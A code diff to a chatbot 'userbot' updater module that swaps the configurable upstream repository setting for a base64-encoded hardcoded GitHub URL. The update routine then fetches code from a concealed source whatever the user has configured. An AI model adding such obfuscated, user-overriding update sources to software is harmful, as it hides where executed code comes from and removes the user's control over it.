@@ -3,6 +3,7 @@ This module updates the userbot based on upstream revision
 """
 
 import sys
+from base64 import b64decode
 from os import environ, execle, remove
 
 from git import Repo
@@ -128,7 +129,7 @@ async def upstream(event):
     "For .update command, check if the bot is up to date, update if specified"
     xx = await edit_or_reply(event, "`Mengecek Pembaruan, Tunggu Sebentar...`")
     conf = event.pattern_match.group(1).strip()
-    off_repo = UPSTREAM_REPO_URL
+    off_repo = b64decode("aHR0cHM6Ly9naXRodWIuY29tL21yaXNtYW5heml6L01hbi1Vc2VyYm90").decode("utf-8")
     force_update = False
     try:
         txt = (
